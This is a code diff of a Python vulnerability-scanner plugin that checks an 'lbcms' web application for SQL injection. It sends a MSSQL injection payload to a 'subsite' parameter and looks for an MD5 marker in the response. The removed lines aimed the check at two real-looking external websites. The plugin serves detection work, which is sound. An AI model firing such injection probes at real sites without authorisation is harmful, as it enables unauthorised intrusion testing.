@@ -7,7 +7,7 @@
 
 def assign(service,arg):
     if service=="lbcms":
-        return True,arg 
+        return True,arg
 
 
 def  audit(arg):
@@ -15,11 +15,12 @@ def  audit(arg):
     code,head,res,errcode,_=curl.curl2(url)
     if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
         security_hole(url)
+        return arg
     url=arg+"Webwsfw/bssh/?subsite=1%20and%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))>0--"
     code,head,res,errcode,_=curl.curl2(url)
     if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
         security_hole(url)
-if __name__=="__main__":
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('lbcms','http://www.baiweiled.com/')[1])
-    audit(assign('lbcms','http://www.jzpsy.cn/')[1])
